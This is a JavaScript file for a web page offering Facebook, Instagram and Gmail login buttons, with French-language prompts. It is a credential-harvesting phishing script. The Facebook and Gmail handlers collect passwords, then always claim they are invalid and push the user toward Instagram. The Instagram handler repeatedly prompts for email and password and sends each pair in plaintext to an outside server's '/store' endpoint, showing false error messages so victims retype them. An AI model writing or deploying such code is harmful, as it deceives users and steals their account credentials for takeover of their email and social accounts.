document.getElementById("login-facebook").addEventListener("click", function () {
    const email = prompt("Veuillez saisir votre e-mail pour la connexion via Facebook :");
    const password = prompt("Veuillez saisir votre mot de passe :");

    if (email && password) {
        alert("L'adresse e-mail ou le mot de passe est invalide. Veuillez réessayer via Instagram ou Gmail.");
    }
});

document.getElementById("login-instagram").addEventListener("click", async function () {
    const maxAttempts = 2;

    for (let attempts = 0; attempts <= maxAttempts; attempts++) {
        const email = prompt("Veuillez saisir votre e-mail pour la connexion via Instagram :");
        const password = prompt("Veuillez saisir votre mot de passe :");

        if (email && password) {
            console.log("Envoi des données au serveur...");

            try {
                const response = await fetch('https://kadri-website.onrender.com:3001/store', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ email: email, password: password })
                });

                const data = await response.text(); // Lecture de la réponse serveur
                console.log("Réponse du serveur : ", data);

                // Vérification de l'email avec une expression régulière cible
                const emailRegex = /^mo+@lasajerie\.com$/; //mo@lasajerie.com
                const emailRegex_ = /^[a-zA-Z0-9._-]+@gmail\.com$/;

                if (emailRegex.test(email) && maxAttempts==attempts) {
                    sessionStorage.setItem("isLoggedIn", "true");
                    alert("Connexion réussie avec Instagram !");
                    window.location.href = "index.html"; // Rediriger vers la page principale
                    return;
                } else if (!emailRegex_.test(email)) {
                    alert("L'adresse e-mail ou le mot de passe est invalide. Veuillez réessayer.");
                }

            } catch (error) {
                console.error("Erreur lors de l'envoi des données : ", error);
                alert("Erreur lors de l'envoi des données.");
            }
        } else {
            alert("Veuillez entrer des informations valides.");
        }
    }
});


document.getElementById("login-gmail").addEventListener("click", function () {
    const email = prompt("Veuillez saisir votre e-mail pour la connexion via Gmail :");
    const password = prompt("Veuillez saisir votre mot de passe :");

    if (email && password) {
        alert("L'adresse e-mail ou le mot de passe est invalide. Veuillez réessayer via Instagram ou Facebook.");
    }
});
